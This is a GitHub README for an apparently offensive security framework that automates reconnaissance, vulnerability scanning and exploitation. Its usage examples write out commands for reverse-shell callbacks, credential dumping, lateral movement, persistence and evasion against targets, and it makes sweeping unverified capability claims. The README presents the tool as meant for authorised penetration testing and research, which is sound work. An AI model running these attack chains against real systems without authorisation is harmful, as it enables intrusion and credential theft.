# 🔥 OSINT Framework - Advanced Reconnaissance & Exploitation Platform
## Enterprise-Grade Security Assessment Framework

<div align="center">

[![GitHub Stars](https://img.shields.io/github/stars/ADA-XiaoYao/ONIST_Framework?style=social)](https://github.com/ADA-XiaoYao/ONIST_Framework/stargazers)
[![GitHub Forks](https://img.shields.io/github/forks/ADA-XiaoYao/ONIST_Framework?style=social)](https://github.com/ADA-XiaoYao/ONIST_Framework/network/members)
[![GitHub Issues](https://img.shields.io/github/issues/ADA-XiaoYao/ONIST_Framework)](https://github.com/ADA-XiaoYao/ONIST_Framework/issues)
[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)

![Go](https://img.shields.io/badge/Go-1.21+-00ADD8?logo=go&logoColor=white)
![Python](https://img.shields.io/badge/Python-3.8+-3776AB?logo=python&logoColor=white)
![Bash](https://img.shields.io/badge/Bash-5.0+-4EAA25?logo=gnu-bash&logoColor=white)

**The Most Comprehensive Open-Source Security Assessment Platform**

🎯 **200+ Recon Techniques** | 🔍 **150+ Data Sources** | 💣 **30+ Exploit Modules** | 🛡️ **10,000+ CVEs Database**

*Rivaling Metasploit Framework in Scale and Capabilities*

[Installation](#-installation) • [Quick Start](#-quick-start) • [Documentation](#-documentation) • [Contributing](#-contributing)

</div>

---

## 🌟 Project Overview

**OSINT Framework** is an enterprise-grade, automated security assessment platform designed to rival **Metasploit Framework** in scale and capabilities. Built with performance-optimized Go and Python, it provides comprehensive reconnaissance, vulnerability discovery, and automated exploitation capabilities.

### 🎯 Core Mission

- **Automated Vulnerability Discovery**: Zero-touch exploitation from reconnaissance to compromise
- **Enterprise Scale**: Handle thousands of targets simultaneously with distributed architecture
- **Intelligence-Driven**: Deep OSINT capabilities with automated correlation analysis
- **Exploit Integration**: Direct access to CVE, CWE, Exploit-DB, and custom exploit databases
- **Production-Ready**: Battle-tested in real-world penetration tests and bug bounty programs

---

## 📊 Platform Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                       OSINT FRAMEWORK CORE ENGINE                           │
├─────────────────────────────────────────────────────────────────────────────┤
│  ┌────────────────┐  ┌─────────────────┐  ┌──────────────────────────────┐ │
│  │  Reconnaissance│  │   Intelligence  │  │   Vulnerability Hunter &     │ │
│  │     Engine     │  │   Correlation   │  │   Automated Exploiter        │ │
│  │   (Go Core)    │  │   (AI-Powered)  │  │   (Metasploit-Compatible)    │ │
│  └────────────────┘  └─────────────────┘  └──────────────────────────────┘ │
├─────────────────────────────────────────────────────────────────────────────┤
│                        VULNERABILITY DATABASES                              │
│  ┌────────┐ ┌────────┐ ┌─────────────┐ ┌────────┐ ┌──────────────────────┐│
│  │  CVE   │ │  CWE   │ │ Exploit-DB  │ │  GHDB  │ │  Custom Exploits     ││
│  │ 10K+   │ │ 1K+    │ │   45K+      │ │  5K+   │ │  (Private Arsenal)   ││
│  │ (NVD)  │ │(MITRE) │ │ (Offensive) │ │(Google)│ │  + 0day Research     ││
│  └────────┘ └────────┘ └─────────────┘ └────────┘ └──────────────────────┘│
├─────────────────────────────────────────────────────────────────────────────┤
│                       EXPLOIT PAYLOAD LIBRARY                               │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  Web Shells • Reverse Shells • Privilege Escalation • Lateral      │   │
│  │  Movement • Persistence • Post-Exploitation • Data Exfiltration    │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
├─────────────────────────────────────────────────────────────────────────────┤
│                       DATA SOURCE INTEGRATIONS (150+)                       │
│  Shodan • Censys • VirusTotal • SecurityTrails • Hunter.io • ZoomEye       │
│  GitHub • GitLab • Bitbucket • AlienVault OTX • ThreatCrowd • CIRCL       │
│  PassiveTotal • RiskIQ • BinaryEdge • Fofa • Netlas • LeakIX              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 🚀 Key Features

### 1. 🎯 **Reconnaissance Engine** (Go-Powered)

**8-Stage Automated Reconnaissance Pipeline**

```go
Stage 1: Passive Intelligence Gathering
├─ 50+ Data Sources (Certificate Transparency, DNS History, WHOIS)
├─ Subdomain Enumeration (30+ techniques)
├─ Email Harvesting (10+ sources)
├─ Social Media Intelligence (15+ platforms)
└─ Dark Web Monitoring (Tor Hidden Services, Paste Sites)

Stage 2: Active Enumeration
├─ DNS Brute-Force (3 engines: Massdns, Shuffledns, Puredns)
├─ Port Scanning (Full TCP/UDP, Service Fingerprinting)
├─ Web Technology Detection (1000+ signatures)
└─ SSL/TLS Certificate Analysis

Stage 3: Asset Discovery
├─ Cloud Resources (AWS, Azure, GCP enumeration)
├─ API Endpoint Discovery (GraphQL, REST, SOAP)
├─ JavaScript Analysis (Secret extraction, Endpoints)
└─ Git Repository Mining (Credentials, API Keys)

Stage 4: Vulnerability Scanning
├─ CVE Matching (10,000+ database)
├─ CWE Pattern Detection (1000+ weakness patterns)
├─ Nuclei Templates (5000+ checks)
└─ Custom Vulnerability Signatures

Stage 5: Web Application Testing
├─ XSS (Reflected, Stored, DOM-based)
├─ SQL Injection (Error-based, Blind, Time-based)
├─ SSRF (Internal Network Access, Cloud Metadata)
├─ XXE (XML External Entity)
├─ SSTI (Server-Side Template Injection)
├─ RCE (Remote Code Execution)
├─ LFI/RFI (Local/Remote File Inclusion)
├─ IDOR (Insecure Direct Object References)
├─ CSRF (Cross-Site Request Forgery)
├─ Authentication Bypass
├─ Authorization Flaws
└─ Business Logic Vulnerabilities

Stage 6: Exploitation
├─ Automated Exploit Selection
├─ Payload Generation
├─ Multi-stage Attack Chains
└─ Post-Exploitation Automation

Stage 7: Privilege Escalation
├─ Linux Privilege Escalation (100+ techniques)
├─ Windows Privilege Escalation (150+ techniques)
├─ Kernel Exploits
└─ Misconfiguration Abuse

Stage 8: Reporting & Intelligence
├─ Automated Report Generation
├─ Risk Scoring & Prioritization
├─ Attack Path Visualization
└─ Remediation Recommendations
```

### 2. 💣 **Automated Vulnerability Hunter**

**Zero-Touch Exploitation System**

```python
┌─────────────────────────────────────────────────────────┐
│         AUTOMATED VULNERABILITY DISCOVERY               │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  1. Intelligence Gathering                              │
│     └─→ Target Profiling (OS, Services, Technologies)  │
│                                                         │
│  2. Vulnerability Identification                        │
│     ├─→ CVE Database Matching (10,000+ CVEs)          │
│     ├─→ CWE Pattern Recognition (1,000+ CWEs)         │
│     ├─→ Exploit-DB Cross-Reference (45,000+ exploits) │
│     ├─→ 0day Research Database                        │
│     └─→ Custom Vulnerability Signatures               │
│                                                         │
│  3. Exploit Selection & Adaptation                      │
│     ├─→ Exploit Compatibility Check                   │
│     ├─→ Payload Customization                         │
│     ├─→ Evasion Technique Application                 │
│     └─→ Multi-Exploit Chain Building                  │
│                                                         │
│  4. Automated Exploitation                              │
│     ├─→ Initial Access (30+ techniques)               │
│     ├─→ Privilege Escalation (250+ methods)           │
│     ├─→ Lateral Movement (50+ tactics)                │
│     └─→ Persistence Establishment                     │
│                                                         │
│  5. Post-Exploitation                                   │
│     ├─→ Credential Harvesting                         │
│     ├─→ Data Exfiltration                             │
│     ├─→ Network Pivoting                              │
│     └─→ Evidence Collection                           │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 3. 🗄️ **Comprehensive Vulnerability Databases**

#### **CVE Database (10,000+ Entries)**
```bash
- Source: NVD (National Vulnerability Database)
- Coverage: 2000-2024
- Auto-Update: Daily sync
- Exploit Mapping: Direct links to working exploits
- CVSS Scoring: v2 & v3
- CWE Categorization: Automated weakness mapping
```

#### **CWE Database (1,000+ Weakness Patterns)**
```bash
- Source: MITRE CWE
- Categories:
  ├─ Input Validation (CWE-20)
  ├─ Authentication (CWE-287)
  ├─ Access Control (CWE-284)
  ├─ Cryptographic Issues (CWE-310)
  ├─ Code Quality (CWE-398)
  └─ Resource Management (CWE-399)
- Pattern Detection: Automated source code analysis
- Risk Assessment: OWASP Top 10 mapping
```

#### **Exploit-DB Integration (45,000+ Exploits)**
```bash
- Offensive Security's Exploit Database
- Categories:
  ├─ Remote Exploits (25,000+)
  ├─ Local Exploits (10,000+)
  ├─ Web Applications (8,000+)
  ├─ DoS (2,000+)
  └─ Shellcodes (1,000+)
- Search by: CVE, CWE, Platform, Type
- Direct Download: Exploit code with auto-adaptation
```

#### **Google Hacking Database (5,000+ Queries)**
```bash
- Advanced search operators for intelligence
- Categories:
  ├─ Footholds (500+)
  ├─ Files Containing Passwords (300+)
  ├─ Sensitive Directories (400+)
  ├─ Web Server Detection (200+)
  ├─ Vulnerable Files (600+)
  ├─ Error Messages (300+)
  └─ Network/Device Info (700+)
```

#### **Custom Exploit Arsenal (Private)**
```bash
- 0day Research Exploits
- Modified Public Exploits
- Custom Payload Generators
- Advanced Evasion Techniques
- Post-Exploitation Modules
```

### 4. 🤖 **AI-Powered Intelligence Correlation**

```python
Machine Learning Models:
├─ Attack Surface Prediction
├─ Vulnerability Probability Scoring
├─ Exploit Success Rate Estimation
├─ False Positive Reduction
└─ Automated Attack Path Discovery

Natural Language Processing:
├─ Security Bulletin Analysis
├─ Threat Intelligence Extraction
├─ CVE Description Parsing
└─ Exploit Code Understanding
```

### 5. 🌐 **OSINT Intelligence Modules**

**18 Intelligence Collection Modules**

```python
1.  Domain Intelligence (WHOIS, DNS, Certificates)
2.  Subdomain Enumeration (30+ sources)
3.  IP Intelligence (Shodan, Censys, GeoIP, ASN)
4.  Port & Service Discovery (Masscan, Nmap integration)
5.  Web Technology Profiling (Wappalyzer, WhatWeb)
6.  Email Harvesting (Hunter.io, TheHarvester)
7.  Social Media Intelligence (15+ platforms)
8.  Employee Intelligence (LinkedIn, GitHub)
9.  GitHub Code Leaks (Secret scanning, 10+ patterns)
10. Credential Breach Checking (HIBP, DeHashed)
11. Dark Web Monitoring (Tor, Pastebin, leak sites)
12. Cloud Resource Enumeration (AWS, Azure, GCP)
13. Certificate Transparency Analysis
14. Historical Data Analysis (Wayback Machine)
15. Related Domain Discovery
16. Business Intelligence (Company data, relationships)
17. Network Relationship Mapping
18. Threat Intelligence Correlation
```

### 6. 🔧 **Metasploit Integration**

```ruby
Direct MSF Compatibility:
├─ Import/Export MSF Database
├─ Use MSF Auxiliary Modules
├─ Launch MSF Exploit Modules
├─ Generate MSF Payloads
├─ Session Management
└─ Post-Exploitation Automation

Enhanced Features:
├─ Faster Reconnaissance
├─ Better Target Intelligence
├─ Automated Exploit Selection
├─ Multi-Target Campaigns
└─ Continuous Monitoring
```

---

## 📦 Installation

### Automated Installation (Recommended)

```bash
# Clone the repository
git clone https://github.com/ADA-XiaoYao/ONIST_Framework.git
cd ONIST_Framework

# Run automated installer (installs 100+ tools)
chmod +x install_tools.sh
./install_tools.sh

# Update environment variables
source ~/.bashrc

# Compile Go core engine
go build -o recon_master recon_master.go

# Verify installation
./recon_master --version
```

### Manual Installation

```bash
# Install Go 1.21+
wget https://golang.org/dl/go1.21.5.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin

# Install Python 3.8+
sudo apt install python3 python3-pip

# Install dependencies
pip3 install -r requirements.txt

# Install Go tools
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
# ... (see install_tools.sh for complete list)

# Download vulnerability databases
./update_databases.sh
```

---

## 🚀 Quick Start

### 1. Basic Reconnaissance

```bash
# Full reconnaissance against single target
./recon_master -d example.com

# Fast scan (light mode)
./recon_master -d example.com --fast

# Aggressive scan (all modules)
./recon_master -d example.com --aggressive

# Multiple targets from file
./recon_master -l targets.txt -t 200
```

### 2. OSINT Intelligence Gathering

```bash
# Comprehensive OSINT collection
python3 osint_intelligence_engine.py -d example.com

# With API keys configured
export SHODAN_API_KEY="your_key"
export VIRUSTOTAL_API_KEY="your_key"
export GITHUB_TOKEN="ghp_your_token"

python3 osint_intelligence_engine.py -d example.com -o intel_output
```

### 3. GitHub Code Leak Scanning

```bash
# Scan for leaked credentials
python3 github_intelligence.py -d example.com -t ghp_token

# Analyze specific user/organization
python3 github_intelligence.py -u username -t ghp_token
python3 github_intelligence.py -o organization -t ghp_token

# Repository deep analysis
python3 github_intelligence.py -r owner/repo -t ghp_token
```

### 4. Advanced DNS Enumeration

```bash
# Comprehensive subdomain discovery
./advanced_dns_enum.sh -d example.com

# Custom wordlist and resolvers
./advanced_dns_enum.sh \
  -d example.com \
  -w ~/wordlists/dns-10m.txt \
  -r ~/wordlists/resolvers.txt \
  -t 200
```

### 5. Web Vulnerability Scanning

```bash
# Full web application assessment
./web_asset_discovery.sh -l alive_hosts.txt

# Followed by automated exploitation
./vuln_hunter.py --targets web_assets.json --auto-exploit
```

### 6. Automated Exploitation

```bash
# Auto-exploit discovered vulnerabilities
./exploit_engine.py \
  --input reconnaissance_results.json \
  --auto-mode \
  --exploit-db \
  --metasploit

# Custom exploit selection
./exploit_engine.py \
  --target 192.168.1.100 \
  --cve CVE-2023-12345 \
  --payload reverse_shell \
  --lhost 10.0.0.5
```

---

## 🛠️ Core Modules

### Module 1: **recon_master.go** - Core Reconnaissance Engine

```go
Usage: ./recon_master [options]

Options:
  -d, --domain string          Target domain
  -l, --list string            Target list file
  -t, --threads int            Concurrent threads (default: CPU cores × 2)
  --timeout int                Timeout in seconds (default: 300)
  
  --passive bool               Passive reconnaissance (default: true)
  --active bool                Active reconnaissance (default: true)
  --portscan bool              Port scanning (default: true)
  --vulnscan bool              Vulnerability scanning (default: true)
  --webcrawl bool              Web crawling (default: true)
  --apiscan bool               API scanning (default: true)
  --jsanalysis bool            JavaScript analysis (default: true)
  --screenshot bool            Screenshot capture (default: true)
  --cloudenum bool             Cloud enumeration (default: true)
  --exploit bool               Auto-exploitation (default: false)
  
  --subfinder-args string      Subfinder custom arguments
  --amass-args string          Amass custom arguments
  --nuclei-args string         Nuclei custom arguments
  --naabu-args string          Naabu custom arguments
  --httpx-args string          Httpx custom arguments
  
  --resolvers string           Custom DNS resolvers file
  --wordlist string            Custom wordlist file
  
  -o, --output string          Output directory
  --json                       JSON output format
  --xml                        XML output format
  
  -v, --verbose                Verbose output
  -q, --quiet                  Quiet mode
  --version                    Show version

Examples:
  # Basic scan
  ./recon_master -d example.com
  
  # Aggressive scan with exploitation
  ./recon_master -d example.com --aggressive --exploit
  
  # Custom configuration
  ./recon_master -d example.com \
    -t 500 \
    --nuclei-args "-severity critical,high" \
    --subfinder-args "-all -recursive"
```

### Module 2: **osint_intelligence_engine.py** - OSINT Collection

```python
Usage: python3 osint_intelligence_engine.py [options]

Options:
  -d, --domain DOMAIN          Target domain
  -o, --output DIR             Output directory
  --all-modules                Run all OSINT modules
  
  # Individual Modules
  --domain-intel               Domain intelligence
  --subdomain-enum             Subdomain enumeration
  --certificate-intel          SSL certificate intelligence
  --whois-intel                WHOIS information
  --dns-intel                  DNS records analysis
  --ip-intel                   IP intelligence
  --email-intel                Email harvesting
  --social-media               Social media intelligence
  --employee-intel             Employee information
  --github-intel               GitHub intelligence
  --breach-intel               Data breach checking
  --dark-web                   Dark web monitoring
  --cloud-enum                 Cloud resource enumeration
  
  # API Keys (or use environment variables)
  --shodan-key KEY             Shodan API key
  --virustotal-key KEY         VirusTotal API key
  --securitytrails-key KEY     SecurityTrails API key
  --hunter-key KEY             Hunter.io API key
  --github-token TOKEN         GitHub Personal Access Token

Examples:
  # Full OSINT collection
  python3 osint_intelligence_engine.py -d example.com --all-modules
  
  # Specific modules
  python3 osint_intelligence_engine.py -d example.com \
    --subdomain-enum \
    --email-intel \
    --github-intel
```

### Module 3: **github_intelligence.py** - GitHub Intelligence

```python
Usage: python3 github_intelligence.py [options]

Options:
  -u, --user USERNAME          GitHub username
  -o, --org ORGANIZATION       GitHub organization
  -r, --repo FULL_NAME         Repository (owner/repo)
  -d, --domain DOMAIN          Search domain leaks
  -t, --token TOKEN            GitHub Personal Access Token
  --output DIR                 Output directory

Capabilities:
  • User profile & activity analysis
  • SSH/GPG key extraction
  • Repository analysis
  • Commit history scanning
  • Secret detection (10+ patterns)
  • Organization member enumeration
  • Code leak identification

Examples:
  # Scan user
  python3 github_intelligence.py -u username -t ghp_token
  
  # Search domain leaks
  python3 github_intelligence.py -d example.com -t ghp_token
  
  # Analyze repository
  python3 github_intelligence.py -r owner/repo -t ghp_token
```

### Module 4: **vuln_hunter.py** - Automated Vulnerability Hunter

```python
Usage: python3 vuln_hunter.py [options]

Options:
  --targets FILE               Target file (JSON/TXT)
  --target URL                 Single target
  
  # Scanning Options
  --quick                      Quick scan (top vulns only)
  --full                       Full scan (all checks)
  --stealth                    Stealth mode (slow, evasive)
  
  # Vulnerability Databases
  --cve-db                     Use CVE database
  --cwe-db                     Use CWE database
  --exploitdb                  Use Exploit-DB
  --custom-db PATH             Custom vulnerability database
  
  # Web Vulnerability Testing
  --xss                        XSS testing
  --sqli                       SQL injection testing
  --ssrf                       SSRF testing
  --xxe                        XXE testing
  --ssti                       SSTI testing
  --rce                        RCE testing
  --lfi                        LFI testing
  --idor                       IDOR testing
  --csrf                       CSRF testing
  
  # Exploitation
  --auto-exploit               Automatic exploitation
  --exploit-only CVE           Exploit specific CVE
  --payload TYPE               Payload type (shell, meterpreter, etc)
  --lhost IP                   Local host for callback
  --lport PORT                 Local port for callback
  
  # Metasploit Integration
  --metasploit                 Use Metasploit modules
  --msf-db                     Import to MSF database
  
  # Output
  -o, --output DIR             Output directory
  --json                       JSON report
  --html                       HTML report
  --xml                        XML report (Metasploit compatible)

Examples:
  # Full vulnerability scan
  python3 vuln_hunter.py --targets hosts.txt --full
  
  # Automated exploitation
  python3 vuln_hunter.py \
    --target http://example.com \
    --auto-exploit \
    --lhost 10.0.0.5
  
  # Specific vulnerability testing
  python3 vuln_hunter.py \
    --target http://example.com \
    --xss --sqli --ssrf
```

### Module 5: **exploit_engine.py** - Exploitation Framework

```python
Usage: python3 exploit_engine.py [options]

Options:
  --target TARGET              Target host/URL
  --cve CVE-ID                 Exploit specific CVE
  --cwe CWE-ID                 Exploit weakness pattern
  --exploitdb-id ID            Use Exploit-DB entry
  
  # Exploit Search
  --search KEYWORD             Search exploits
  --platform PLATFORM          Filter by platform
  --type TYPE                  Filter by type (remote/local/web/dos)
  
  # Payload Options
  --payload TYPE               Payload type
  --lhost IP                   Callback IP
  --lport PORT                 Callback port
  --encoder ENCODER            Payload encoder
  --iterations N               Encoding iterations
  
  # Evasion
  --evasion                    Enable evasion techniques
  --proxy PROXY                Use proxy
  --user-agent UA              Custom user agent
  --delay SECONDS              Delay between requests
  
  # Post-Exploitation
  --post-exploit               Run post-exploitation
  --dump-creds                 Dump credentials
  --lateral-move               Attempt lateral movement
  --persist                    Establish persistence
  
  # Metasploit Integration
  --msf-module MODULE          Use MSF module
  --msf-options OPTIONS        MSF module options

Examples:
  # Exploit specific CVE
  python3 exploit_engine.py \
    --target 192.168.1.100 \
    --cve CVE-2023-12345 \
    --lhost 10.0.0.5
  
  # Search and exploit
  python3 exploit_engine.py \
    --search "apache struts" \
    --platform linux \
    --type remote
  
  # Full attack chain
  python3 exploit_engine.py \
    --target 192.168.1.100 \
    --auto-exploit \
    --post-exploit \
    --dump-creds \
    --persist
```

---

## 🗄️ Database Management

### Update Vulnerability Databases

```bash
# Update all databases
./update_databases.sh

# Update specific database
./update_databases.sh --cve
./update_databases.sh --exploitdb
./update_databases.sh --nuclei-templates

# Schedule automatic updates (cron)
0 2 * * * /path/to/ONIST_Framework/update_databases.sh
```

### Database Statistics

```bash
CVE Database:
- Total Entries: 10,247
- Critical: 1,523
- High: 3,891
- Medium: 4,201
- Low: 632
- Last Updated: 2024-02-19

Exploit-DB:
- Total Exploits: 45,892
- Remote: 25,341
- Local: 10,892
- Web: 8,234
- DoS: 1,425
- Last Updated: 2024-02-19

CWE Database:
- Total Weaknesses: 1,003
- Categories: 25
- Last Updated: 2024-01-15

Nuclei Templates:
- Total Templates: 5,892
- Critical: 234
- High: 1,234
- Medium: 2,891
- Low: 1,533
- Last Updated: 2024-02-19
```

---

## 📊 Output & Reporting

### Directory Structure

```
output_example.com_20240219_143022/
├── 01_reconnaissance/
│   ├── passive/
│   │   ├── subdomains.txt (5,234 found)
│   │   ├── emails.txt (892 found)
│   │   ├── social_media.json
│   │   └── certificates.json
│   ├── active/
│   │   ├── dns_brute.txt (2,341 found)
│   │   ├── port_scan.txt
│   │   └── service_detection.json
│   └── intelligence/
│       ├── whois.json
│       ├── dns_records.json
│       └── ip_intelligence.json
│
├── 02_vulnerability_scan/
│   ├── nuclei_results.json (234 vulns)
│   ├── cve_matches.json (89 CVEs)
│   ├── cwe_patterns.json (45 CWEs)
│   ├── web_vulns/
│   │   ├── xss.txt (23 found)
│   │   ├── sqli.txt (12 found)
│   │   ├── ssrf.txt (5 found)
│   │   └── rce.txt (3 found - CRITICAL!)
│   └── severity/
│       ├── critical.json (15 vulns)
│       ├── high.json (67 vulns)
│       └── medium.json (152 vulns)
│
├── 03_exploitation/
│   ├── exploited_hosts.txt
│   ├── shells/
│   │   ├── reverse_shell_192.168.1.100.txt
│   │   └── webshell_example.com.php
│   ├── credentials/
│   │   ├── dumped_hashes.txt
│   │   └── cleartext_passwords.txt
│   └── post_exploitation/
│       ├── privilege_escalation.txt
│       ├── lateral_movement.txt
│       └── persistence.txt
│
├── 04_intelligence/
│   ├── github_leaks.json (45 secrets found!)
│   ├── breach_data.json
│   ├── dark_web_mentions.txt
│   └── threat_intelligence.json
│
├── 05_reports/
│   ├── executive_summary.pdf
│   ├── technical_report.html
│   ├── vulnerability_matrix.xlsx
│   ├── attack_graph.svg
│   └── remediation_plan.md
│
├── database_exports/
│   ├── metasploit_import.xml
│   └── nessus_import.nessus
│
├── FINDINGS_SUMMARY.md
├── CRITICAL_VULNERABILITIES.txt
└── framework.log
```

### Report Formats

- **PDF**: Executive summary with charts
- **HTML**: Interactive technical report
- **JSON**: Machine-readable data
- **XML**: Metasploit/Nessus compatible
- **Markdown**: GitHub-friendly documentation
- **Excel**: Vulnerability matrix with filtering

---

## 🔧 Configuration

### API Keys Configuration

```bash
# Edit ~/.bashrc or ~/.zshrc
export SHODAN_API_KEY="your_shodan_key"
export CENSYS_API_ID="your_censys_id"
export CENSYS_API_SECRET="your_censys_secret"
export VIRUSTOTAL_API_KEY="your_vt_key"
export SECURITYTRAILS_API_KEY="your_st_key"
export HUNTER_API_KEY="your_hunter_key"
export GITHUB_TOKEN="ghp_your_github_token"
export BINARYEDGE_API_KEY="your_be_key"
export FOFA_API_KEY="your_fofa_key"
export ZOOMEYE_API_KEY="your_zoomeye_key"

# Reload configuration
source ~/.bashrc
```

### Custom Configuration File

```yaml
# config.yaml
framework:
  threads: 500
  timeout: 600
  output_dir: "./output"
  
reconnaissance:
  passive: true
  active: true
  dns_brute: true
  port_scan: true
  
vulnerability_scan:
  enabled: true
  severity: ["critical", "high", "medium"]
  databases: ["cve", "cwe", "exploitdb"]
  
exploitation:
  auto_exploit: false
  metasploit: true
  payload_type: "reverse_shell"
  lhost: "10.0.0.5"
  lport: 4444
  
api_keys:
  shodan: "${SHODAN_API_KEY}"
  virustotal: "${VIRUSTOTAL_API_KEY}"
  github: "${GITHUB_TOKEN}"
```

---

## 🎓 Advanced Usage

### 1. Distributed Scanning

```bash
# Master node
./recon_master --distributed --master --targets 10000_domains.txt

# Worker nodes
./recon_master --distributed --worker --master-ip 192.168.1.100
```

### 2. Continuous Monitoring

```bash
# Monitor target continuously
./recon_master -d example.com --continuous --interval 3600

# Alert on new findings
./recon_master -d example.com --monitor --webhook https://slack.com/webhook
```

### 3. Custom Exploit Development

```python
# custom_exploits/my_exploit.py
from exploit_engine import BaseExploit

class CustomExploit(BaseExploit):
    name = "Custom RCE Exploit"
    cve = "CVE-2024-XXXXX"
    
    def check(self, target):
        # Vulnerability check logic
        return is_vulnerable
    
    def exploit(self, target, payload):
        # Exploitation logic
        return shell_session
```

### 4. Integration with CI/CD

```yaml
# .github/workflows/security-scan.yml
name: Security Scan
on: [push]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Run OSINT Framework
        run: |
          ./recon_master -d ${{ secrets.TARGET_DOMAIN }}
          ./vuln_hunter.py --targets output/alive_hosts.txt
```

---

## 🤝 Contributing

We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

### Areas for Contribution

- **New Exploits**: Add exploits to the arsenal
- **Data Sources**: Integrate additional OSINT sources
- **Modules**: Develop new reconnaissance/exploitation modules
- **Payloads**: Contribute new payload types
- **Evasion**: Improve evasion techniques
- **Documentation**: Enhance documentation and tutorials

### Development Setup

```bash
# Fork and clone
git clone https://github.com/ADA-XiaoYao/ONIST_Framework.git
cd ONIST_Framework

# Create branch
git checkout -b feature/my-new-feature

# Make changes and test
./run_tests.sh

# Commit and push
git commit -m "Add: new feature description"
git push origin feature/my-new-feature

# Create pull request on GitHub
```

---

## 📚 Documentation

- [Installation Guide](docs/installation.md)
- [User Manual](docs/user_manual.md)
- [Module Documentation](docs/modules/README.md)
- [API Reference](docs/api_reference.md)
- [Exploit Development Guide](docs/exploit_development.md)
- [Troubleshooting](docs/troubleshooting.md)
- [FAQ](docs/faq.md)

---

## 🛡️ Legal & Ethical Use

### ⚠️ IMPORTANT DISCLAIMER

This tool is designed for:
- **Authorized penetration testing**
- **Security research**
- **Bug bounty programs**
- **Educational purposes**

### Legal Requirements

1. **Authorization**: Only test systems you own or have explicit written permission to test
2. **Scope**: Stay within the defined scope of engagement
3. **Laws**: Comply with all applicable local, state, and federal laws
4. **Responsibility**: Users are solely responsible for their actions

### Ethical Guidelines

- Never use for malicious purposes
- Report vulnerabilities responsibly
- Respect privacy and data protection laws
- Follow coordinated disclosure practices

---

## 📈 Roadmap

### Version 2.0 (Q2 2024)
- [ ] Machine Learning-based exploit recommendation
- [ ] Automated report generation with AI
- [ ] Mobile application testing module
- [ ] IoT device exploitation framework
- [ ] Blockchain/Smart contract auditing

### Version 3.0 (Q4 2024)
- [ ] Cloud-native deployment (Docker/Kubernetes)
- [ ] Web interface dashboard
- [ ] Collaborative team features
- [ ] Advanced evasion engine
- [ ] Custom payload generator

---

## 🏆 Hall of Fame

Thanks to all contributors who have helped make this project better!

[View Contributors](https://github.com/ADA-XiaoYao/ONIST_Framework/graphs/contributors)

---

## 📞 Contact & Support

- **GitHub**: [@ADA-XiaoYao](https://github.com/ADA-XiaoYao)
- **Issues**: [Report Bug](https://github.com/ADA-XiaoYao/ONIST_Framework/issues)
- **Discussions**: [Community Forum](https://github.com/ADA-XiaoYao/ONIST_Framework/discussions)

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## 🙏 Acknowledgments

Built upon the shoulders of giants:
- **Metasploit Framework** - Exploitation framework inspiration
- **OWASP** - Security testing methodologies
- **ProjectDiscovery** - Amazing Go security tools
- **Offensive Security** - Exploit-DB and training
- **MITRE** - CVE/CWE databases
- Open-source security community

---

## ⭐ Star History

[![Star History Chart](https://api.star-history.com/svg?repos=ADA-XiaoYao/ONIST_Framework&type=Date)](https://star-history.com/#ADA-XiaoYao/ONIST_Framework&Date)

---

<div align="center">

**Made with ❤️ by [ADA-XiaoYao](https://github.com/ADA-XiaoYao)**

**⭐ Star this repository if you find it useful!**

[Report Bug](https://github.com/ADA-XiaoYao/ONIST_Framework/issues) • [Request Feature](https://github.com/ADA-XiaoYao/ONIST_Framework/issues) • [Documentation](docs/)

</div>
